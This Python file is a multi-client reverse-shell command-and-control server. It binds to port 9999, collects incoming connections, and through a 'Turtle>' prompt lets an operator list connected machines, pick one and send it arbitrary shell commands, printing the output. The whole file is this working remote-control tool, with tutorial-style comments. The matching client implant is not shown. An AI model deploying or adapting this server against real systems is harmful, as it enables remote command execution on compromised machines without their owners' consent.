import socket
import sys
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NO = [1, 2]
queue = Queue()
all_connections = []
all_address = []


def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error : ' + str(msg))


def bind_socket():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        s.listen(5)
        print('Binding to the port 9999')
    except socket.error as msg:
        print('Socket binding error : ' + str(msg) + " Retrying......")
        bind_socket()


# Multiple clients adding
# We have to close and delete the all the previous connections and previous address at the beggining of the server program

def accept_connection():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)
            print("The connection has been established with the address : "+ str(address[0]))
            all_connections.append(conn)
            all_address.append(address)
        except socket.error as msg:
            print("Socket accepting error : "+str(msg))
            accept_connection()


# 2nd Thread sea all connections see a particular connection sending command to a particular client
# Intereactive prompt

def start_turtle():
    while True:
        cmd = input("Turtle>")
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_commands(conn)
        else:
            print("Command not recognised")


def list_connections():
    results = ''
    n = 1
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
            n = i
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results += str(n)+"  "+ str(all_address[i][0]) + "|" + str(all_address[i][1]) + "\n"

    print("---------clients-----------\n"+results)


def get_target(cmd):
    try:
        target = cmd.replace('select', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to : "+str(all_address[target][0]))
        print(str(all_address[target][0])+">",end='')
        return conn
    except:
        print("Selection not valid")
        return None


def send_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
            # We cant send the string directly so we have to convert the string into bytes
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                # Buffer size is 1024 and to convert the output bytes to string we are using utf=0
                output = str(conn.recv(201480),'utf-8')
                # After displaying next line has to introduced for entering new oommand
                print(output, end='')
        except:
            print('Error sending commands')



# Creating the threads

def create_workers():
    for i in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        # To end the thread when the program ends
        t.daemon = True
        t.start()


# Threads dont take jobs from the list they take jobs from the queue

def create_jobs():
    for x in JOB_NO:
        queue.put(x)

    queue.join()

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connection()
        if x == 2:
            start_turtle()

        queue.task_done()


create_workers()
create_jobs()












